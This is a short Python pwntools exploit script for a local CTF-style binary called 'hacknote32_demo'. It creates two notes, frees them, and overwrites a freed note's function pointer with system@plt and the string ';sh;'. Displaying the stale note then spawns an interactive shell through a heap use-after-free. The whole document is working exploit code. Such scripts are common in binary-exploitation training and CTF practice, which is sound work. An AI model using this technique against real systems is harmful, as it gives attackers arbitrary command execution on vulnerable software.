from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./hacknote32_demo"
libc_binary = "/lib/i386-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("127.0.0.1",9000)

elf = ELF(binary)
libc = ELF(libc_binary)

def opt(idx):
    p.sendlineafter("Your choice :",str(idx))

def add(length,content):
    opt(1)
    p.sendlineafter("Note size :",str(length))
    p.sendlineafter("Content :",str(content))

def free(idx):
    opt(2)
    p.sendlineafter("Index :",str(idx))

def list(idx):
    opt(3)
    p.sendlineafter("Index :",str(idx))


add(0x30-4,"a"*8)
add(0x30-4,"b"*8)
free(1)
free(0)

payload = flat([
    elf.plt["system"]+6,";sh;"
    ])

add(8,payload)
# gdb.attach(p)
list(1)

p.interactive()
